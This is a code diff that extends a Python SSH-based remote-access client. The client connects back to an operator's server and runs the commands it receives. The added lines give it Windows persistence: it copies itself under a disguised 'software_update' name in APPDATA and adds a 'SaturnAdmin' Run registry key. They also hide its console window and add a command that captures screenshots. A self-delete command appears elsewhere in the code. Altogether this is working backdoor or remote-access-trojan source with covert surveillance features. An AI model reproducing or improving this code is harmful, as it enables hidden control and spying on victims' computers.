@@ -1,20 +1,64 @@
 #!/usr/bin/env python3
+import datetime
 import socket
 import os
 import sys
 import time
 import subprocess
+import shutil
 import paramiko
 import getpass
 from pathlib import Path
+from PIL import ImageGrab
 
 # CONFIGURATION
-IP = '192.168.56.104' #your server ip
+IP = '' #your server ip
 PORT = 2222 #port for your server
-USERNAME = 'trid' #your server name
-PASSWORD = '5731' #your server password
+USERNAME = '' #your server namei
+PASSWORD = '' #your server password
 
 current_dir = Path(__file__).parent
+
+def set_persistence():
+    current_os = os.name
+    if current_os == 'nt':
+        try:
+            import winreg
+
+            if getattr(sys, 'frozen', False):
+                exe_path = Path(sys.executable).resolve()
+                path_name = 'software_update.exe'
+            else:
+                exe_path = Path(__file__).resolve()
+                path_name = 'software_update.py'
+            
+            appdata_dir = Path(os.environ['APPDATA']) / 'SystemUpdates'
+
+            appdata_dir.mkdir(exist_ok=True, parents=True)
+            target_path = appdata_dir / path_name
+
+            if exe_path != target_path:
+                shutil.copyfile(exe_path, target_path)
+
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) # type: ignore
+
+            winreg.SetValueEx(key, 'SaturnAdmin', 0, winreg.REG_SZ, str(target_path)) # type: ignore
+            winreg.CloseKey(key) # type: ignore
+
+        except Exception:
+            pass
+
+def stealth_mode():
+    current_os = os.name
+    if current_os == 'nt':
+        import ctypes
+
+        kernel32 = ctypes.WinDLL('kernel32') # type: ignore
+        user32 = ctypes.WinDLL('user32') # type: ignore
+
+        hWnd = kernel32.GetConsoleWindow()
+        if hWnd != 0:
+            user32.ShowWindow(hWnd, 0)
 
 def execute_command(command):
     '''function to execute commands from server'''
@@ -33,6 +77,8 @@ def execute_command(command):
 
 def start_client():
     global current_dir
+    stealth_mode()
+    set_persistence()
     while True:
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -67,14 +113,14 @@ def start_client():
 
                 if command.lower() == 'delete':
                     if getattr(sys, 'frozen', False):
-                        exe_path = sys.executable
+                        exe_path = Path(sys.executable)
                     else:
                         exe_path = Path(__file__)
 
                     current_os = os.name
                     
                     if current_os == 'nt':
-                        cmd_command = f'timeout /t 3 && del /f /q "{exe_path}" && shutdown /s /t 0'
+                        cmd_command = f'timeout /t 3 && del /f /q "{exe_path.resolve()}"'
                         CREATE_NO_WINDOW = 0x08000000
                         subprocess.Popen(cmd_command, shell=True, creationflags=CREATE_NO_WINDOW)
                     else:
@@ -171,6 +217,20 @@ def start_client():
                         cmd_result = f'File {file_name} uploaded successfully.\n'.encode('utf-8')
                     except Exception as e:
                         cmd_result = f'Upload error on client: {e}\n'.encode('utf-8')
+                    result_len = len(cmd_result)
+                    chan.sendall(f'{result_len}\n'.encode('utf-8'))
+                    chan.sendall(cmd_result)
+                    continue
+
+                if command == 'screenshot':
+                    time_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+                    file_name = f'screenshot_{time_str}.png'
+                    file_path = current_dir / file_name
+
+                    screenshot = ImageGrab.grab()
+                    screenshot.save(file_path)
+
+                    cmd_result = f'Screenshot {file_name} successfully shot.\n'.encode('utf-8')
                     result_len = len(cmd_result)
                     chan.sendall(f'{result_len}\n'.encode('utf-8'))
                     chan.sendall(cmd_result)
